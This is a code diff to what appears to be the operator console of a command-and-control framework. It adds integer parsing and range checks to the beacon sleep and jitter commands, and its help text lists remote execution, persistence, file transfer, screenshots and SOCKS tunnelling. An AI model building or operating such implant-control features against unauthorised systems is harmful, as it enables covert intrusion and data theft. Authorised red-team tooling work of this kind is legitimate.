@@ -618,7 +618,7 @@ def _prompt(state: dict) -> str:
 def _show_help():
     help_text = """
 Session:  list | use <id> | info | background | kill [id]
-Beacon:   set_sleep <s> | set_jitter <%> | show_config
+Beacon:   set_sleep <seconds> | set_jitter <percent> | show_config
 Remote:   <command>  (queue) | exec <command>  (wait) | persist <cmd> | stop
 Files:    download <remote> | upload <local> <remote> | screenshot
 Tunnel:   socks [port] | socks stop   (SOCKS5 on 127.0.0.1, default 1080)
@@ -929,9 +929,17 @@ def run_interactive(
                 if not sid:
                     warn("No session selected")
                     continue
-                code, _ = client.patch_config(sid, sleep_seconds=int(rest[0]))
+                try:
+                    sleep_val = int(rest[0])
+                except ValueError:
+                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. set_sleep 5)")
+                    continue
+                if not 1 <= sleep_val <= 3600:
+                    warn("Sleep must be between 1 and 3600 seconds")
+                    continue
+                code, _ = client.patch_config(sid, sleep_seconds=sleep_val)
                 if code == 200:
-                    say(f"Sleep -> {rest[0]}s on server (agent applies on next beacon; watch for [config_ack])")
+                    say(f"Sleep -> {sleep_val}s on server (agent applies on next beacon; watch for [config_ack])")
                 else:
                     warn(f"failed ({code})")
                 continue
@@ -943,9 +951,17 @@ def run_interactive(
                 if not sid:
                     warn("No session selected")
                     continue
-                code, _ = client.patch_config(sid, jitter_percent=int(rest[0]))
+                try:
+                    jitter_val = int(rest[0])
+                except ValueError:
+                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. set_jitter 30)")
+                    continue
+                if not 0 <= jitter_val <= 100:
+                    warn("Jitter must be between 0 and 100")
+                    continue
+                code, _ = client.patch_config(sid, jitter_percent=jitter_val)
                 if code == 200:
-                    say(f"Jitter -> {rest[0]}% on server (agent applies on next beacon; watch for [config_ack])")
+                    say(f"Jitter -> {jitter_val}% on server (agent applies on next beacon; watch for [config_ack])")
                 else:
                     warn(f"failed ({code})")
                 continue
